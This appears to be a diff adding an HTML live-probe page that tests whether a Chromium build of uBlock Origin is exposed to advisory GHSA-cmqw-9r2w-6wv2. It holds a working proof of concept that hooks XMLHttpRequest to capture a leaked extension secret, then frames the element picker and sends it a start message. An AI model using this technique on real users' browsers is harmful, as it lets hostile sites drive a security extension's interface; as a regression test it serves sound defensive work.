@@ -1,0 +1,48 @@
+<!doctype html>
+<!-- GHSA-cmqw-9r2w-6wv2 live probe: a website tries to frame and drive the
+     built-in uBlock Origin element picker (the advisory's proof of concept,
+     ported to Chromium). Serve it from a host that matches a default war:
+     filter, e.g. http://dropgalaxy.localhost:PORT/ (scripts/cmux-next/ext-mv2-live.py serves it). The page
+     title ends as "VULNERABLE ..." when the picker answered the page, or
+     "SAFE ..." when it did not within 15 s. Nothing is clicked and no filter
+     is created: the probe stops at the picker's "start" reply. -->
+<meta charset="utf-8">
+<title>probing</title>
+<pre id="log"></pre>
+<iframe id="f" style="width:400px;height:200px"></iframe>
+<script>
+const ID = 'cjpalhdlnbpafiamejdnhcphjbkeiagm';
+const log = s => { document.getElementById('log').textContent += s + '\n'; };
+let done = false, leaked = null;
+const finish = verdict => { if (done) return; done = true; document.title = verdict; log(verdict); };
+// Step 1: capture the extension URL (with its WAR secret) a war: scriptlet requests.
+const open = XMLHttpRequest.prototype.open;
+XMLHttpRequest.prototype.open = function (m, url, ...a) {
+  const e = /^chrome-extension:\/\/[^/]+\/[^?]*(\?.*)?$/.exec(String(url));
+  if (e && !leaked) { leaked = String(url); log('leaked ' + leaked); mount(new URL(leaked).searchParams.get('secret')); }
+  return open.call(this, m, url, ...a);
+};
+// Step 2: frame the picker and send it the start message without its launch secret.
+let mounted = false;
+function mount(secret) {
+  if (mounted) return; mounted = true;
+  const f = document.getElementById('f');
+  const q = secret ? `?secret=${secret}` : '';
+  f.onload = () => {
+    const t = setInterval(() => {
+      if (done) return clearInterval(t);
+      const ch = new MessageChannel();
+      ch.port1.onmessage = ({ data }) => {
+        if (data && data.what === 'start') { clearInterval(t); finish(`VULNERABLE picker answered (secret ${secret ? 'leaked' : 'not needed'})`); }
+      };
+      f.contentWindow.postMessage({ what: 'epickerStart' }, '*', [ch.port2]);
+    }, 250);
+  };
+  f.src = `chrome-extension://${ID}/web_accessible_resources/epicker-ui.html${q}`;
+  log('framing ' + f.src);
+}
+fetch('/adsbygoogle.js').catch(() => {});
+// No leak (newer uBlock disables war: filters): try the picker without a secret.
+setTimeout(() => mount(null), 3000);
+setTimeout(() => finish(`SAFE picker did not answer (leak ${leaked ? 'yes' : 'no'})`), 15000);
+</script>
